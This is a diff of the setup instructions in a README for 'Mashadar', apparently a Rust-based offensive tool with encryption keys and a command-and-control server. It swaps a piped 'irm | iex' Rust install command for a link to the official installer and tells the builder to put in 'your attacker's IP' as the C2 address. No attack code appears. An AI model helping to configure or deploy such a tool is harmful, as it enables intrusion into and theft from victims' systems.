@@ -33,26 +33,25 @@ mashadar/
 
 # 🔧 **Setup & Compilation**
 ### 1️⃣ **Install Rust on Windows**
-Run the following command in **PowerShell**:
-```sh
-irm https://sh.rustup.rs | iex
-```
+
+On Windows, go to https://www.rust-lang.org/tools/install and follow the instructions for installing Rust. At some point in the installation, you’ll be prompted to install Visual Studio. This provides a linker and the native libraries needed to compile the program. If you need more help with this step, see https://rust-lang.github.io/rustup/installation/windows-msvc.html
+
 For **cross-compilation on Linux/macOS**, install `mingw`:
 ```sh
 rustup target add x86_64-pc-windows-gnu
 ```
 
 ### 2️⃣ **Set the Encryption Password**
-Modify `src/encryption.rs`, setting your own **encryption key and nonce**:
+Modify `src/main.rs`, setting your own **encryption key and nonce**:
 ```rust
 let key: [u8; 16] = *b"mysecretkey12345";
 let nonce: [u8; 16] = *b"random_iv_nonce_"; // Must be exactly 16 bytes
 ```
 
 ### 3️⃣ **Modify the C2 Server Address**
-Edit `src/c2.rs`, replacing `"192.168.1.100:8080"` with your attacker's IP:
+Edit `src/c2.rs`, replacing `"0.0.0.0:8080"` with your attacker's IP:
 ```rust
-let server_ip = "192.168.1.100:8080";
+let server_ip = "0.0.0.0:8080";
 ```
 
 ### 4️⃣ **Compile Mashadar**
